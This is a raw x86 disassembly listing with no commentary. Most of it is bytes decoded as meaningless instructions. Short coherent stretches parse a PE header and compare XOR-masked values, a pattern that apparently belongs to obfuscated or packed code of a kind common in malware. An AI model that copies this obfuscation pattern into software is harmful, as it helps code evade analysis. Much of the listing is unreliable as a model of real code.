  408cae:	cmp    BYTE PTR [ebx],al
  408cb0:	ret    
  408cb1:	inc    ecx
  408cb2:	iret   
  408cb3:	mov    bl,0x3f
  408cb5:	and    esi,ecx
  408cb7:	(bad)  
  408cb9:	outs   dx,DWORD PTR ds:[esi]
  408cba:	adc    eax,DWORD PTR [ebp-0x40]
  408cbd:	or     ch,0xb8
  408cc0:	(bad)  [ebp+0x18]
  408cc3:	call   0x313af417
  408cc8:	dec    ebp
  408cc9:	xlat   BYTE PTR ds:[ebx]
  408cca:	ins    DWORD PTR es:[edi],dx
  408ccb:	ins    BYTE PTR es:[edi],dx
  408ccc:	in     al,dx
  408ccd:	xchg   ebp,eax
  408cce:	pop    esi
  408ccf:	daa    
  408cd0:	dec    edx
  408cd1:	pop    esp
  408cd2:	push   ebx
  408cd3:	or     DWORD PTR [eax+0x5b],esp
  408cd6:	(bad)  
  408cd7:	mov    eax,ds:0x70243960
  408cdc:	xchg   ebp,eax
  408cdd:	or     BYTE PTR [ebx+0x5b20d859],ch
  408ce3:	fs leave 
  408ce5:	loop   0x408cb9
  408ce7:	dec    edx
  408ce8:	clc    
  408ce9:	repz jno 0x408cdf
  408cec:	and    BYTE PTR [ecx-0x494e14e5],ah
  408cf2:	inc    ebx
  408cf3:	pop    ds
  408cf4:	cmp    dl,bl
  408cf6:	mov    eax,0x28134e7b
  408cfb:	bnd js 0x408ca3
  408cfe:	in     al,dx
  408cff:	aaa    
  408d00:	dec    ebx
  408d01:	mov    bl,0x5c
  408d03:	mov    eax,ds:0x438b9175
  408d08:	dec    ecx
  408d0a:	xchg   ecx,eax
  408d0b:	in     eax,0x6e
  408d0d:	add    ebp,DWORD PTR [esi]
  408d0f:	push   0x8a409ab4
  408d14:	jb     0x408cf5
  408d16:	push   edi
  408d17:	repz mov bh,0x83
  408d1a:	loop   0x408cac
  408d1c:	loopne 0x408cd0
  408d1e:	adc    ebp,DWORD PTR [eax]
  408d20:	out    0xd5,al
  408d22:	das    
  408d23:	rcl    DWORD PTR [ebp+0x5a477ec8],cl
  408d29:	pop    edi
  408d2a:	jmp    0xe67db97a
  408d2f:	fdiv   QWORD PTR ds:[esi+esi*4]
  408d33:	(bad)  
  408d34:	aas    
  408d35:	xchg   edi,eax
  408d36:	mov    esp,0xd01245ab
  408d3b:	dec    ecx
  408d3c:	xchg   DWORD PTR [ebp+0x1c45aad2],ecx
  408d42:	in     al,0x44
  408d44:	jecxz  0x408d88
  408d46:	pop    esi
  408d47:	clc    
  408d48:	cmp    DWORD PTR [eax-0x54a2901f],0xffffff80
  408d4f:	(bad)  
  408d50:	push   esi
  408d51:	push   esi
  408d52:	jle    0x408dca
  408d54:	xchg   BYTE PTR [eax+0x3d],al
  408d57:	in     al,0xbb
  408d59:	mov    edi,0xd33cbec9
  408d5e:	rcr    DWORD PTR [eax+0x66],0xcc
  408d62:	mov    BYTE PTR [ebx-0x77008ffe],dl
  408d68:	sub    ecx,DWORD PTR [eax+esi*2+0x6b]
  408d6c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408d6d:	push   edx
  408d6e:	mov    cl,0x55
  408d70:	dec    ebp
  408d71:	adc    DWORD PTR [ebx+eiz*4],ebp
  408d74:	loop   0x408d9f
  408d76:	mov    edx,0xaa10941b
  408d7b:	scas   eax,DWORD PTR es:[edi]
  408d7c:	dec    ebx
  408d7d:	add    al,0x8
  408d7f:	outs   dx,DWORD PTR ds:[esi]
  408d80:	push   ebp
  408d81:	pop    ds
  408d82:	icebp  
  408d83:	pop    ebp
  408d84:	xor    DWORD PTR [eax],esi
  408d86:	aad    0x36
  408d88:	push   0x1e
  408d8a:	ins    BYTE PTR es:[edi],dx
  408d8b:	add    dh,BYTE PTR [edx]
  408d8d:	and    BYTE PTR [ecx],0xaa
  408d90:	scas   eax,DWORD PTR es:[edi]
  408d91:	out    dx,al
  408d92:	and    al,0xbf
  408d94:	(bad)  
  408d95:	int3   
  408d96:	ret    
  408d97:	das    
  408d98:	mov    esp,0x108410d2
  408d9d:	leave  
  408d9e:	cld    
  408d9f:	sbb    eax,edx
  408da1:	loop   0x408d88
  408da3:	mov    edx,0x43d39d4d
  408da8:	rcl    DWORD PTR [edi+0x5],cl
  408dab:	pop    edi
  408dac:	iret   
  408dad:	and    al,BYTE PTR [ebx]
  408daf:	push   eax
  408db0:	mov    eax,0xa5d1ffdc
  408db5:	cmc    
  408db6:	xchg   esp,eax
  408db7:	jmp    0x8b5a:0x7daa8e2e
  408dbe:	enter  0x613b,0x9b
  408dc2:	adc    eax,0xd1eedc1
  408dc7:	or     al,0x70
  408dc9:	or     edx,DWORD PTR [esp+esi*1+0x4a55c9b6]
  408dd0:	imul   esi,edi,0xffffffb7
  408dd3:	and    al,0x12
  408dd5:	xor    dl,al
  408dd7:	call   0xbdfe:0xc17a7b26
  408dde:	push   eax
  408ddf:	jbe    0x408e10
  408de1:	imul   edi,DWORD PTR ds:0x3d5da2aa,0x8b2e7164
  408deb:	mov    DWORD PTR [edi-0x130f0ee8],eax
  408df1:	push   eax
  408df2:	dec    ebp
  408df3:	cdq    
  408df4:	xor    esp,DWORD PTR [ebp-0x12]
  408df7:	loop   0x408da9
  408df9:	rol    BYTE PTR [edx-0x45fcc3f],cl
  408dff:	pop    edi
  408e00:	(bad)  
  408e01:	test   eax,0x39dc1cd
  408e06:	sub    al,0xb2
  408e08:	cmp    DWORD PTR [eax-0x10],edi
  408e0b:	pminub mm2,mm2
  408e0e:	cli    
  408e0f:	adc    ah,BYTE PTR [ebx-0x34]
  408e12:	inc    ebx
  408e13:	stc    
  408e14:	sub    DWORD PTR [ebx],ebp
  408e16:	xchg   ebx,eax
  408e17:	jp     0x408e09
  408e19:	popa   
  408e1a:	mov    DWORD PTR [eax-0x285af645],edx
  408e20:	add    dh,BYTE PTR [ecx-0x29]
  408e23:	popf   
  408e24:	lds    esi,FWORD PTR [ecx]
  408e26:	mov    ax,WORD PTR [ebp-0x4]
  408e2a:	movzx  eax,ax
  408e2d:	sub    ecx,edi
  408e2f:	cmp    eax,ecx
  408e31:	mov    eax,DWORD PTR [ebp+0x10]
  408e34:	movzx  ecx,WORD PTR [ebp-0x4]
  408e38:	jg     0x408e4d
  408e3e:	xor    eax,esi
  408e40:	sub    ecx,eax
  408e42:	sub    ecx,edi
  408e44:	mov    WORD PTR [ebp-0x4],cx
  408e48:	jmp    0x408e5a
  408e4d:	xor    eax,esi
  408e4f:	lea    eax,[eax+ecx*1+0x32729b]
  408e56:	mov    WORD PTR [ebp-0x4],ax
  408e5a:	mov    eax,DWORD PTR [ebp-0xc]
  408e5d:	cmp    eax,ebx
  408e5f:	je     0x408e73
  408e65:	mov    eax,DWORD PTR [ebp-0x8]
  408e68:	mov    DWORD PTR [eax],0x60341e89
  408e6e:	jmp    0x409836
  408e73:	mov    eax,DWORD PTR [ebp+0x8]
  408e76:	mov    ecx,DWORD PTR [ebp-0x8]
  408e79:	xor    eax,esi
  408e7b:	add    eax,edi
  408e7d:	cmp    DWORD PTR [ecx],eax
  408e7f:	je     0x409149
  408e85:	mov    ecx,DWORD PTR [ebp-0x14]
  408e88:	mov    eax,DWORD PTR [ebp-0x8]
  408e8b:	mov    eax,DWORD PTR [eax]
  408e8d:	mov    eax,DWORD PTR [eax+0x3c]
  408e90:	lea    ecx,[ecx*8+0x78]
  408e97:	add    eax,ecx
  408e99:	mov    ecx,DWORD PTR [ebp-0x8]
  408e9c:	mov    ecx,DWORD PTR [ecx]
  408e9e:	mov    eax,DWORD PTR [eax+ecx*1]
  408ea1:	mov    DWORD PTR [ebp-0x1c],eax
  408ea4:	mov    eax,DWORD PTR [ebp+0x8]
  408ea7:	jmp    0x4090ee
  408eac:	sbb    al,0x56
  408eae:	aam    0xcf
  408eb0:	je     0x408eff
  408eb2:	and    eax,0xfc4f2b75
  408eb7:	adc    eax,0x42019bff
  408ebc:	or     al,0xd1
  408ebe:	jle    0x408f3e
  408ec0:	and    al,0x7c
  408ec2:	jle    0x408f42
  408ec4:	or     eax,0x82e51aea
  408ec9:	dec    ebp
  408eca:	(bad)  
  408ecb:	pop    eax
  408ecc:	or     al,0x99
  408ece:	ss shr ebp,1
  408ed1:	pop    eax
  408ed2:	(bad)  
  408ed3:	repnz es sbb bl,ch
  408ed7:	xor    edx,eax
  408ed9:	stc    
  408eda:	or     eax,0x1b1358cc
  408edf:	sub    eax,0xe51e79e
  408ee4:	push   esp
  408ee5:	pop    esi
  408ee6:	aam    0x49
  408ee8:	and    eax,0x398de032
  408eed:	fcmovne st,st(7)
  408eef:	imul   esi,ebp,0xfffffff5
  408ef2:	ret    
  408ef3:	jmp    0x5502:0xc5b0ac46
  408efa:	lea    ecx,[ecx+0x27]
  408efd:	adc    BYTE PTR [eax],bh
  408eff:	into   
  408f00:	or     cl,BYTE PTR [edi]
  408f02:	jae    0x408f08
  408f04:	push   ecx
  408f05:	xor    al,BYTE PTR [edi+eax*1]
  408f08:	xlat   BYTE PTR ds:[ebx]
  408f09:	out    0xbf,al
  408f0b:	shl    DWORD PTR [eax],1
  408f0d:	lods   eax,DWORD PTR ds:[esi]
  408f0e:	in     eax,0x6c
  408f10:	mov    bl,0xf
  408f12:	push   esi
  408f13:	inc    ecx
  408f14:	faddp  st(3),st
  408f16:	je     0x408f92
  408f18:	retf   0x7ac3
  408f1b:	inc    ebx
  408f1c:	ds mov al,0x66
  408f1f:	mov    ecx,0x431353c8
  408f24:	xor    edx,edx
  408f26:	ins    DWORD PTR es:[edi],dx
  408f27:	daa    
  408f28:	inc    ebx
  408f29:	nop
  408f2a:	jno    0x408f1c
  408f2c:	ins    BYTE PTR es:[edi],dx
  408f2d:	in     al,0xbb
  408f2f:	es mov bh,0xf7
  408f32:	popf   
  408f33:	iret   
  408f34:	call   0x40f7:0x8ec44a91
  408f3b:	dec    ecx
  408f3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f3d:	fnsave [edx+0x7c2ba500]
  408f43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408f44:	icebp  
  408f45:	add    al,0x9a
  408f47:	fwait
  408f48:	pop    esi
  408f49:	int    0xf
  408f4b:	stos   DWORD PTR es:[di],eax
  408f4d:	mov    edi,0xf4a4c49b
  408f52:	or     DWORD PTR [ecx+ecx*1-0x6bebb2d1],eax
  408f59:	add    eax,0x93aaf829
  408f5e:	sbb    DWORD PTR [ebx-0x49],eax
  408f61:	xchg   esp,eax
  408f62:	inc    esp
  408f63:	jo     0x408f5f
  408f65:	mov    BYTE PTR [esi-0x66bf5a64],dl
  408f6b:	loop   0x408fbf
  408f6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408f6e:	retf   
  408f6f:	push   esi
  408f70:	fcmovne st,st(1)
  408f72:	or     BYTE PTR [eax+0x5546d1c7],0xd7
  408f79:	mov    edi,0xe6c7eaa
  408f7e:	rcr    BYTE PTR [ebp-0x20361f39],1
  408f84:	adc    BYTE PTR ds:0x680bab43,dh
  408f8a:	xchg   edi,eax
  408f8b:	aam    0x85
  408f8d:	(bad)  
  408f8f:	or     cl,al
  408f91:	xchg   ebp,eax
  408f92:	aas    
  408f93:	sbb    eax,0x81383061
  408f98:	mov    ecx,0xfc38ab57
  408f9d:	inc    edi
  408f9e:	mov    bh,0xde
  408fa0:	dec    esi
  408fa1:	sbb    ch,BYTE PTR [eax-0x1a4f9338]
  408fa7:	push   ss
  408fa8:	push   ebx
  408fa9:	sbb    esi,esp
  408fab:	xchg   ebx,eax
  408fac:	push   esi
  408fad:	sub    BYTE PTR [eax],ah
  408faf:	jb     0x408faa
  408fb1:	xor    al,0xc1
  408fb3:	xor    ebp,DWORD PTR [ebx+eax*2]
  408fb6:	jne    0x40902d
  408fb8:	adc    bh,cl
  408fba:	mul    BYTE PTR [ebp-0x3b]
  408fbd:	cld    
  408fbe:	call   0x8329:0xc66791bd
  408fc5:	ins    BYTE PTR es:[edi],dx
  408fc6:	cmp    bh,ah
  408fc8:	xor    al,0x5d
  408fca:	cmc    
  408fcb:	mov    edi,0x82bf6093
  408fd0:	std    
  408fd1:	mov    edi,0x275049de
  408fd6:	inc    ebx
  408fd7:	lods   eax,DWORD PTR ds:[esi]
  408fd8:	mov    bh,0x52
  408fda:	inc    ebx
  408fdb:	push   cs
  408fdc:	push   eax
  408fdd:	push   eax
  408fde:	xor    al,0x23
  408fe0:	not    cl
  408fe2:	jle    0x408ff8
  408fe4:	push   es
  408fe5:	or     edi,DWORD PTR [edx+ecx*8-0x769bcf6f]
  408fec:	clc    
  408fed:	xor    DWORD PTR [ecx],ebx
  408fef:	ds stc 
  408ff1:	int    0x42
  408ff3:	ret    
  408ff4:	icebp  
  408ff5:	je     0x409063
  408ff7:	retf   0x313
  408ffa:	jmp    0x409074
  408ffc:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ffe:	imul   edx,DWORD PTR [edx-0x52],0xb37e3947
  409005:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409006:	sub    eax,0x9e2ea913
  40900b:	ror    BYTE PTR [ebx],0x30
  40900e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40900f:	loop   0x40904a
  409011:	shl    ecx,1
  409013:	and    al,0x3b
  409015:	popf   
  409016:	jne    0x408f9f
  409018:	cmc    
  409019:	and    eax,0xd85af4e7
  40901e:	(bad)  
  40901f:	repnz sti 
  409021:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409022:	mov    esp,0x989b8459
  409027:	pop    ss
  409028:	jbe    0x409095
  40902a:	mov    ecx,0x25ed959a
  40902f:	nop
  409030:	cli    
  409031:	out    0x17,al
  409033:	repz mov bh,0x11
  409036:	je     0x408fb8
  409038:	cmp    eax,0x6ee93b9f
  40903d:	fisub  DWORD PTR [edx-0x11cac4e2]
  409043:	xchg   edi,eax
  409044:	cmp    al,0x1b
  409046:	jl     0x409017
  409048:	mov    es,WORD PTR [ebp-0x41]
  40904b:	test   eax,0x9e497b14
  409050:	or     al,0x9f
  409052:	aam    0x25
  409054:	test   al,0xff
  409056:	fwait
  409057:	lea    ecx,[edi]
  409059:	and    dl,BYTE PTR [esi-0x249cd736]
  40905f:	data16 jne 0x408ffb
  409062:	push   ecx
  409063:	mov    dh,0xdc
  409065:	mov    dh,0x43
  409067:	mov    ecx,0x86e78637
  40906c:	(bad)  
  40906d:	cmc    
  40906e:	leave  
  40906f:	push   ss
  409070:	mov    bl,0xf9
  409072:	push   ss
  409073:	push   ecx
  409074:	leave  
  409075:	jo     0x409099
  409077:	jbe    0x40908f
  409079:	cmp    al,0x84
  40907b:	jbe    0x40907d
  40907d:	ret    0xfa8c
  409080:	std    
  409081:	cld    
  409082:	xchg   esi,eax
  409083:	mov    al,ds:0x2bf03ab0
  409088:	call   0x94cf0c27
  40908d:	inc    ecx
  40908e:	les    esp,FWORD PTR gs:[edx]
  409091:	jae    0x409021
  409093:	outs   dx,DWORD PTR ds:[esi]
  409094:	xchg   edi,eax
  409095:	pop    edi
  409096:	add    dh,0x65
  409099:	xor    al,0x64
  40909b:	test   al,ah
  40909d:	add    al,0x47
  40909f:	adc    eax,0xe0e718cf
  4090a4:	xor    BYTE PTR [edi-0x70],bl
  4090a7:	repnz push esp
  4090a9:	scas   al,BYTE PTR es:[edi]
  4090aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090ab:	dec    eax
  4090ac:	repnz adc BYTE PTR ds:0x3adad791,0xd0
  4090b4:	push   es
  4090b5:	lods   eax,DWORD PTR ds:[esi]
  4090b6:	cmp    ch,BYTE PTR [edx]
  4090b8:	mov    WORD PTR [ebp-0x47],gs
  4090bb:	adc    DWORD PTR [eax-0x33],0xf1a75fea
  4090c2:	mov    ebx,0x911beff9
  4090c7:	jnp    0x4090fb
  4090c9:	mov    dh,0x30
  4090cb:	inc    ecx
  4090cc:	(bad)  
  4090cd:	retf   
  4090ce:	outs   dx,DWORD PTR ds:[esi]
  4090cf:	in     eax,0xee
  4090d1:	ja     0x409132
  4090d3:	pop    ecx
  4090d4:	fwait
  4090d5:	xchg   edi,eax
  4090d6:	ret    
  4090d7:	jmp    0x4090f1
  4090d9:	jl     0x409094
  4090db:	jne    0x409068
  4090dd:	retf   
  4090de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4090df:	std    
  4090e0:	cmp    ah,BYTE PTR [eax+0x978562]
  4090e6:	add    al,0x43
  4090e8:	retf   0xa241
  4090eb:	test   BYTE PTR [ebx-0x57],al
  4090ee:	xor    eax,esi
  4090f0:	add    eax,edi
  4090f2:	mov    DWORD PTR [ebp-0x20],eax
  4090f5:	mov    eax,DWORD PTR [ebp+0x8]
  4090f8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4090fb:	xor    eax,esi
  4090fd:	add    eax,edi
  4090ff:	cmp    ecx,eax
  409101:	je     0x409836
  409107:	mov    eax,DWORD PTR [ebp-0x8]
  40910a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40910d:	add    ecx,DWORD PTR [eax]
  40910f:	mov    DWORD PTR [ebp-0x20],ecx
  409112:	mov    eax,DWORD PTR [ebp-0x20]
  409115:	mov    ecx,DWORD PTR [ebp-0x8]
  409118:	mov    eax,DWORD PTR [eax+0xc]
  40911b:	mov    ecx,DWORD PTR [ecx]
  40911d:	mov    al,BYTE PTR [eax+ecx*1]
  409120:	add    al,0x38
  409122:	xor    al,0x46
  409124:	cmp    al,0xc5
  409126:	je     0x40913d
  40912c:	mov    eax,DWORD PTR [ebp+0x8]
  40912f:	mov    ecx,DWORD PTR [ebp-0x8]
  409132:	xor    eax,esi
  409134:	add    eax,edi
  409136:	mov    DWORD PTR [ecx],eax
  409138:	jmp    0x409836
  40913d:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  409144:	jmp    0x409836
  409149:	mov    eax,DWORD PTR [ebp-0x8]
  40914c:	mov    ecx,DWORD PTR [ebp-0x18]
  40914f:	mov    ecx,DWORD PTR [ecx]
  409151:	jmp    0x409398
  409156:	sbb    eax,0xe1aec100
  40915b:	outs   dx,DWORD PTR ds:[esi]
  40915c:	jno    0x4090ef
  40915e:	out    dx,al
  40915f:	jne    0x4090f6
  409161:	mov    bh,0x30
  409163:	or     al,0xd1
  409165:	sub    esi,DWORD PTR [edx]
  409167:	fistp  QWORD PTR [esi+0x7e]
  40916a:	and    al,0x7c
  40916c:	jle    0x4091ec
  40916e:	(bad)
  409171:	xchg   esi,eax
  409172:	loopne 0x409134
  409174:	shl    DWORD PTR [ecx-0x2c],0x86
  409178:	mov    DWORD PTR [ecx-0x6d],ebp
  40917b:	cmp    eax,0x654a8b2a
  409180:	xor    DWORD PTR [edx],esi
  409182:	imul   ecx,DWORD PTR [esi-0x44ee12a2],0xffffffd6
  409189:	hlt    
  40918a:	aas    
  40918b:	xor    eax,DWORD PTR [eax-0x78]
  40918e:	cmp    eax,0x75938348
  409193:	push   edi
  409194:	sbb    BYTE PTR [eax+eax*8+0x7f],bh
  409198:	enter  0xef15,0xeb
  40919c:	mov    edi,0xdbb90700
  4091a1:	sbb    edx,0xc7c7617f
  4091a7:	ins    DWORD PTR es:[edi],dx
  4091a8:	in     eax,0x64
  4091aa:	cmp    edx,DWORD PTR [eax+0x49]
  4091ad:	mov    ecx,0x12534965
  4091b2:	mov    ebx,0x89bacb24
  4091b7:	xor    al,BYTE PTR [eax-0x3f]
  4091ba:	repnz les esp,FWORD PTR [edx+0x75f05443]
  4091c1:	daa    
  4091c2:	out    dx,al
  4091c3:	push   ecx
  4091c4:	pop    esi
  4091c5:	add    dh,BYTE PTR [edi]
  4091c7:	sbb    eax,0x8c4299f5
  4091cc:	fstp   TBYTE PTR [edx]
  4091ce:	xor    edi,esi
  4091d0:	add    DWORD PTR [edx+0x71],0x54
  4091d4:	pop    ss
  4091d5:	(bad)  
  4091d6:	test   al,0xa5
  4091d8:	pop    ecx
  4091d9:	xor    BYTE PTR [esi+0x3db2ec8e],al
  4091df:	fdivr  QWORD PTR [esi]
  4091e1:	mov    bl,0xec
  4091e3:	mov    ebx,0xf6c04683
  4091e8:	or     bh,BYTE PTR [edi+ebp*1+0x8]
  4091ec:	push   esp
  4091ed:	into   
  4091ee:	push   ecx
  4091ef:	jbe    0x4091f1
  4091f1:	cmp    ecx,DWORD PTR [ebx]
  4091f3:	and    cl,bl
  4091f5:	daa    
  4091f6:	mov    ds:0xd633466d,al
  4091fb:	dec    esi
  4091fc:	repnz ror edx,0x93
  409200:	sti    
  409201:	out    0xfa,eax
  409203:	or     DWORD PTR [ebp+0x32],esp
  409206:	push   ds
  409207:	jl     0x409227
  409209:	stos   DWORD PTR es:[edi],eax
  40920a:	mov    ?,WORD PTR [ecx-0x44]
  40920d:	popa   
  40920e:	or     eax,DWORD PTR [eax-0x405a3fa]
  409214:	aad    0xb4
  409216:	imul   eax,DWORD PTR [edi],0xbacb5e66
  40921c:	jge    0x4091ea
  40921e:	adc    eax,0xa13b47f
  409223:	inc    eax
  409224:	ret    0x91ac
  409227:	push   ebp
  409228:	fs jns 0x4091ae
  40922b:	js     0x4091c7
  40922d:	jno    0x409298
  40922f:	push   ebx
  409230:	inc    eax
  409231:	sar    DWORD PTR [esi+0x5e],0x2b
  409235:	outs   dx,DWORD PTR ds:[esi]
  409236:	adc    BYTE PTR [edi+0x75],cl
  409239:	outs   dx,DWORD PTR ds:[esi]
  40923a:	push   cs
  40923b:	dec    DWORD PTR [eax]
  40923d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40923e:	mov    dh,0x51
  409240:	test   BYTE PTR [edx-0xc2232a],dl
  409246:	stos   BYTE PTR es:[edi],al
  409247:	ins    BYTE PTR es:[edi],dx
  409248:	popf   
  409249:	aas    
  40924a:	and    eax,edx
  40924c:	(bad)  
  40924d:	sbb    BYTE PTR [eax+0x56],cl
  409250:	dec    ebx
  409251:	out    0xed,eax
  409253:	pop    eax
  409254:	fld    DWORD PTR [ebx-0x77d690b3]
  40925a:	test   DWORD PTR ds:0xba47f26a,ebp
  409260:	jae    0x409211
  409262:	mov    dl,0x7
  409264:	(bad)  
  409265:	jl     0x409262
  409267:	enter  0x538e,0x44
  40926b:	imul   edi,DWORD PTR [ebx-0x36],0xfffffff3
  40926f:	add    al,0xf7
  409271:	mov    gs,WORD PTR [edi]
  409273:	cmp    dh,BYTE PTR [eax-0x50ee2bd4]
  409279:	mov    BYTE PTR [edi-0x3edfe380],0x83
  409280:	ret    0x8d06
  409283:	ins    BYTE PTR es:[edi],dx
  409284:	scas   eax,DWORD PTR es:[edi]
  409285:	xchg   eax,ebp
  409287:	imul   esp,DWORD PTR [edx],0x5
  40928a:	lock adc eax,0x9cbbe2a4
  409290:	or     BYTE PTR [ebx+0x56096965],cl
  409296:	cmp    bl,BYTE PTR [edi+0x633b3506]
  40929c:	mov    al,0x3c
  40929e:	xor    al,0x9f
  4092a0:	cmp    edi,DWORD PTR cs:[eax+0x63]
  4092a4:	cmp    al,dh
  4092a6:	rcr    edx,1
  4092a8:	ret    
  4092a9:	(bad)  
  4092aa:	dec    ebp
  4092ab:	fcomp  QWORD PTR [eax-0x35f791b3]
  4092b1:	and    al,0x35
  4092b3:	in     eax,0x2
  4092b5:	sbb    eax,0x8c7b146f
  4092ba:	sub    eax,0x44c18dbd
  4092bf:	sub    eax,0xd2c648ae
  4092c4:	ja     0x4092c7
  4092c6:	or     DWORD PTR [ebx],ebp
  4092c8:	rsqrtps xmm6,XMMWORD PTR [ebx]
  4092cb:	xor    eax,0xd41edec8
  4092d0:	xchg   DWORD PTR [esi+0x7d],eax
  4092d3:	xor    DWORD PTR [ecx+0x26],ebx
  4092d6:	les    esp,FWORD PTR [esi+0xa]
  4092d9:	lds    edi,FWORD PTR [edi+0x47ae864a]
  4092df:	mov    edx,0x4bf5a85
  4092e4:	mov    edi,0x419bb71
  4092e9:	xchg   esi,eax
  4092ea:	mov    ds:0xb70f1c45,al
  4092ef:	data16 cmp BYTE PTR [ebx*1-0x492c3d1e],bh
  4092f7:	test   eax,0x319793c6
  4092fc:	mov    esp,0xa14215b9
  409301:	popf   
  409302:	loopne 0x40933f
  409304:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409305:	cmp    al,al
  409307:	out    0xe,al
  409309:	inc    edx
  40930a:	mul    DWORD PTR [ebx-0x73c84837]
  409310:	jns    0x409385
  409312:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409313:	or     DWORD PTR [ebx-0x66],ebx
  409316:	shr    DWORD PTR fs:[esi+0x11],0xec
  40931b:	aad    0xf5
  40931d:	jae    0x4092bc
  40931f:	push   cs
  409320:	pop    eax
  409321:	cld    
  409322:	inc    ebx
  409323:	lahf   
  409324:	xor    eax,0x96c3ef43
  409329:	mov    ebx,0x22985fc2
  40932e:	dec    ebx
  40932f:	dec    edi
  409330:	mov    WORD PTR [edx-0x6e24ca8f],fs
  409336:	das    
  409337:	mov    cl,0xa7
  409339:	jecxz  0x409319
  40933b:	push   ebx
  40933c:	idiv   BYTE PTR [eax]
  40933e:	in     eax,dx
  40933f:	daa    
  409340:	jo     0x409375
  409342:	call   0x85a8:0xb5a490f3
  409349:	icebp  
  40934a:	add    esp,esp
  40934c:	(bad)  
  40934d:	aaa    
  40934e:	sbb    BYTE PTR [eax],bh
  409350:	repz mov dl,0xd9
  409353:	(bad)  ds:[eax-0x1c]
  409357:	fld    st(6)
  409359:	fisub  DWORD PTR [ebp+0x28]
  40935c:	jl     0x40938f
  40935e:	cli    
  40935f:	call   0xe4fd:0x97bd5eb8
  409366:	push   es
  409367:	adc    BYTE PTR [edx],dl
  409369:	pop    ss
  40936a:	pop    eax
  40936b:	jne    0x40934b
  40936d:	ficomp DWORD PTR ds:0x9f906356
  409373:	sub    eax,0xc85b3d98
  409378:	xor    eax,0xe369d543
  40937d:	(bad)  
  40937e:	imul   DWORD PTR [esp+esi*8-0x4f]
  409382:	or     eax,0x6d221dfe
  409387:	sub    al,0x21
  409389:	xchg   edx,eax
  40938a:	bound  esp,QWORD PTR [ecx+0x18]
  40938d:	sbb    edi,DWORD PTR [edi*1+0x4974067b]
  409394:	mov    bh,0x2f
  409396:	sahf   
  409397:	lods   eax,DWORD PTR ds:[esi]
  409398:	mov    DWORD PTR [eax],ecx
  40939a:	mov    eax,DWORD PTR [ebp+0xc]
  40939d:	mov    eax,DWORD PTR [ebp+0x8]
  4093a0:	push   DWORD PTR [ebp-0x8]
  4093a3:	jmp    0x4095ea
  4093a8:	lods   eax,DWORD PTR ds:[esi]
  4093a9:	mov    dl,0xfe
  4093ab:	outs   dx,BYTE PTR ds:[esi]
  4093ac:	xor    DWORD PTR [edx+0x6d],0x15d7aa71
  4093b3:	pop    edi
  4093b4:	sub    edx,DWORD PTR es:[ebp-0x55]
  4093b8:	fcomp  st(5)
  4093ba:	jle    0x40943a
  4093bc:	and    al,0x7c
  4093be:	jle    0x40943e
  4093c0:	in     al,0x92
  4093c2:	ret    
  4093c3:	xor    ecx,DWORD PTR [ebp+0x58]
  4093c6:	adc    BYTE PTR [ecx+edx*8+0x65],bh
  4093ca:	inc    esp
  4093cb:	inc    esi
  4093cc:	pop    es
  4093cd:	pop    eax
  4093ce:	aaa    
  4093cf:	or     ah,ah
  4093d1:	add    dl,BYTE PTR [eax-0x67c3c047]
  4093d7:	inc    ebx
  4093d8:	pop    ebx
  4093d9:	adc    eax,DWORD PTR [esi-0x64]
  4093dc:	addr16 aaa 
  4093de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093df:	sub    esp,DWORD PTR [edx+ebp*1]
  4093e2:	fcmovnbe st,st(5)
  4093e4:	push   es
  4093e5:	adc    edi,DWORD PTR [edx+0x7d7246c9]
  4093eb:	and    eax,0xf1cd6592
  4093f0:	sub    dh,BYTE PTR [eax]
  4093f2:	daa    
  4093f3:	jle    0x40940a
  4093f5:	jmp    0xc1bb:0xf47b3aa8
  4093fc:	stc    
  4093fd:	cmp    BYTE PTR [edi+ebx*4+0x3d9a6116],dl
  409404:	mov    bl,dh
  409406:	mov    WORD PTR [eax+0x4bee74de],?
  40940c:	xor    DWORD PTR [edi],edi
  40940e:	sar    BYTE PTR [ebp+0x7c],0x2f
  409412:	nop
  409413:	sbb    al,0xd9
  409415:	(bad)  
  409417:	adc    dl,dl
  409419:	xchg   edx,eax
  40941a:	ret    0x3013
  40941d:	fisubr WORD PTR [eax+0x6e]
  409420:	cmp    BYTE PTR [ebx],al
  409422:	call   0x2709:0x10e38b0d
  409429:	add    bh,ch
  40942b:	adc    dl,ah
  40942d:	(bad)  
  40942e:	mov    dl,0x35
  409430:	dec    esp
  409431:	or     eax,0x5bed6ee3
  409436:	sbb    al,0x79
  409438:	test   BYTE PTR [ebx],0xe9
  40943b:	adc    BYTE PTR [eax],dh
  40943d:	mov    bl,0x5c
  40943f:	(bad)  
  409441:	ret    
  409442:	ja     0x409461
  409444:	push   esi
  409445:	(bad)  
  409446:	mov    esp,0xffbced23
  40944b:	mov    ecx,0x660c2c1b
  409450:	call   0xd807:0x9bcee047
  409457:	xchg   ebp,eax
  409458:	and    cl,BYTE PTR [eax+0x460ba12b]
  40945e:	adc    esi,eax
  409460:	sub    eax,0x80aeb985
  409465:	jmp    0x2db5bfb2
  40946a:	push   es
  40946b:	sub    DWORD PTR [ecx+0x6e],ecx
  40946e:	ins    BYTE PTR es:[edi],dx
  40946f:	rol    DWORD PTR [ebx-0x5e30947a],1
  409475:	dec    ecx
  409476:	(bad)  
  409477:	outs   dx,DWORD PTR ds:[esi]
  409478:	and    al,0xef
  40947a:	in     al,0x24
  40947c:	jle    0x4094b1
  40947e:	cli    
  40947f:	int    0x84
  409481:	pop    esi
